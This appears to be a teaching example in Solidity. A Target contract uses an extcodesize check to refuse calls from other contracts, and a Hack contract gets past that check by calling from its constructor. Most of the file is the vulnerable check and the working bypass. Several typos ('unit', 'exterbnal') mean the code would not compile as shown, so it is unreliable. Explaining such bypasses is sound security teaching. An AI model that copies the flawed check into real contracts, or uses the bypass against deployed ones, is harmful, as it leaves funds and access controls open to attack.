//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract Target {

// This method relies on extcodesize, if extcodesize == 0 means is not a contratc 
function isContract(address account) public view returns(bool){
    unit size;
    assembly{ size := extcodesize(account)};
    return size > 0;
}  

bool public allow = false;

function protected() external{
    require(!isContract(msg.sender),"no contract allow");
    allow = true;

}
}

contract FailedAttack{

    // Attempting to call Target.protected will fail 
    //Target contract will block calls from contracts

    function failAttack(address _target) exterbnal{

        Target(_target).protected();
    }
}

contract Hack{

    bool public isContract;
    address public addr;

    // When contract is being created, code size ( extcodesize = 0 )
    // this will pass isContract checks is the Target contract will

    constructor(address _target){

        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        Target(_target).protected();

    }


}
